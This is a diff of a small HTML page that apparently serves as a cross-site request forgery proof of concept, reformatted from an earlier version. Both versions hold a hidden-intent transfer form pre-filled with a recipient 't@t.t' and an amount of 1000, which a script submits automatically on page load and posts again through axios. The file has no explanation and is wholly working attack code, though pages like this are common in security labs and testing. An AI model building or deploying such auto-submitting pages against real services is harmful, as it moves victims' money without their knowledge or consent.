@@ -1,35 +1,32 @@
-<html>
+<html lang="">
 <head>
-<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+    <title></title>
 </head>
 <body>
-<form id="transfer" name="transfer" action="/transfer" method="POST">
-            <div class="form-row">
-              <div class="form-group col-md-6">
-                <label for="inputTo">To</label>
-                <input type="text" class="form-control" id="inputTo" name="user_to" placeholder="Who do you want to transfer to?" value="t@t.t">
-              </div>
-              <div class="form-group col-md-6">
-                <label for="inputAmount">Amount</label>
-                <input type="number" class="form-control" id="inputAmount" name="amount" placeholder="Amount to transfer" value="1000">
-              </div>
-            </div>
-            <button type="submit" class="btn btn-primary">Send the Money!</button>
-          </form>
+<form id="transfer" method="POST" name="transfer">
+    <div class="form-row">
+        <div class="form-group col-md-6">
+            <label for="inputTo">To</label>
+            <input class="form-control" id="inputTo" name="user_to" placeholder="Who do you want to transfer to?"
+                   type="text" value="t@t.t">
+        </div>
+        <div class="form-group col-md-6">
+            <label for="inputAmount">Amount</label>
+            <input class="form-control" id="inputAmount" name="amount" placeholder="Amount to transfer" type="number"
+                   value="1000">
+        </div>
+    </div>
+    <button class="btn btn-primary" type="submit" formaction="/transfer">Send the Money!</button>
+</form>
 <script>
-  document.getElementById("transfer").requestSubmit();
-  const formData = new FormData();
-  formData.append("user_to", "t@t.t")
-  formData.append("amount", 1000)
-  axios.post('/transfer',formData, {
-   headers: { "Content-Type": "multipart/form-data" }
-  })
-  .then(function (response) {
-	console.log(response);
-  })
-  .catch(function (error) {
-	console.log(error);
-  });
+    document.forms.namedItem("transfer").requestSubmit();
+    const formData = new FormData();
+    formData.append("user_to", "t@t.t")
+    formData.append("amount", 1000)
+    axios.post('/transfer', formData, {
+        headers: {"Content-Type": "multipart/form-data"}
+    });
 </script>
 </body>
 </html>
